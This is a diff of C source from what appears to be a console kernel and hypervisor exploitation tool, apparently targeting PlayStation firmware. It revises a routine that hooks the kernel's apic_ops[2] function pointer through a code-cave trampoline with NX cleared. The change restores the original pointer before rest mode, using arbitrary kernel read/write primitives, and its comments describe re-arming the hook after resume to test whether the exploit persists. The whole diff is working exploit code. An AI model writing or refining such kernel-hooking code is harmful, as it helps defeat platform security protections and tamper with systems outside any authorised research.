@@ -5165,22 +5165,29 @@ static void campaign_flatz_setup(void) {
             }
 
             if (hook_armed) {
-                /* Flush TLB on all CPUs before entering rest mode.
-                 * The cave trampoline's PTE had NX cleared, but other CPUs
-                 * may have stale TLB entries with NX=1.  Clearing the G bit
-                 * ensures the entry is flushed on next CR3 reload (context
-                 * switch).  We sleep 3 seconds to guarantee all CPUs have
-                 * context-switched at least once (timer IRQ fires at 100Hz+). */
+                /* Restore apic_ops[2] to the ORIGINAL xapic_mode before
+                 * entering rest mode.  During suspend, cpususpend_handler
+                 * on secondary CPUs calls xapic_mode() via apic_ops[2].
+                 * The KLD trampoline pages may not be executable at the
+                 * NPT level on all CPUs (only the CPU that ran kldload
+                 * is guaranteed to have the NPT entry), causing kernel
+                 * panic on secondary CPUs.
+                 *
+                 * The hook target is saved in the cave marker (offset
+                 * 0x18) and QA flags so it can be re-armed after resume.
+                 * This lets us safely test persistence of the MARKERS
+                 * without risking a panic from the hook itself. */
                 printf("[+]\n");
-                printf("[*] Waiting 3s for TLB flush on all CPUs...\n");
-                fflush(stdout);
-                fflush(stderr);
-                sleep(3);
-                printf("[+] TLB flush window complete.\n");
+                printf("[*] Restoring apic_ops[2] to original before rest mode...\n");
+                kernel_copyin(&original_xapic,
+                              g_dmap_base + ops_pa + 0x10, 8);
+                uint64_t restore_verify = 0;
+                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
+                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                       (unsigned long)restore_verify,
+                       restore_verify == original_xapic ? "OK" : "FAIL");
 
-                /* Enter rest mode programmatically — bypasses PS button
-                 * interaction which would trigger APIC calls on CPUs that
-                 * may still have stale TLB entries, causing kernel panic. */
+                /* Enter rest mode programmatically */
                 printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
                 fflush(stdout);
                 fflush(stderr);
@@ -5194,7 +5201,6 @@ static void campaign_flatz_setup(void) {
                            standby_ret, errno);
                     printf("[!] Falling back to manual rest mode entry.\n");
                     printf("[!] Navigate to: Settings → System → Power → Rest Mode\n");
-                    printf("[!] Do NOT press the PS button — it may cause kernel panic.\n");
                     notify("[HV Research] Auto-standby failed! Manually enter rest mode.");
                 }
             } else {
@@ -5933,13 +5939,25 @@ static void campaign_flatz_setup(void) {
                 printf("[+]\n");
                 printf("[+] QA flags set with original xapic for restore.\n");
 
-                /* Wait for TLB flush on all CPUs, then enter rest mode
-                 * programmatically to avoid PS button kernel panic. */
-                printf("[*] Waiting 3s for TLB flush on all CPUs...\n");
-                fflush(stdout);
-                fflush(stderr);
-                sleep(3);
-                printf("[+] TLB flush window complete.\n");
+                /* Restore apic_ops[2] to original before entering rest
+                 * mode.  During suspend, cpususpend_handler on secondary
+                 * CPUs calls xapic_mode() via apic_ops[2].  The hooked
+                 * target (KLD trampoline or ktext gadget) may not be
+                 * safely callable from secondary CPUs during the suspend
+                 * path (NPT execute permissions on KLD pages are not
+                 * guaranteed for all CPUs).  Restoring the original
+                 * prevents kernel panic during LAPIC suspend. */
+                printf("[*] Restoring apic_ops[2] to original before rest mode...\n");
+                kernel_copyin(&current_xapic,
+                              g_dmap_base + hook_ops_pa + 0x10, 8);
+                uint64_t restore_verify2 = 0;
+                kernel_copyout(g_dmap_base + hook_ops_pa + 0x10,
+                               &restore_verify2, 8);
+                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                       (unsigned long)restore_verify2,
+                       restore_verify2 == current_xapic ? "OK" : "FAIL");
+
+                /* Enter rest mode programmatically */
                 printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
                 fflush(stdout);
                 fflush(stderr);
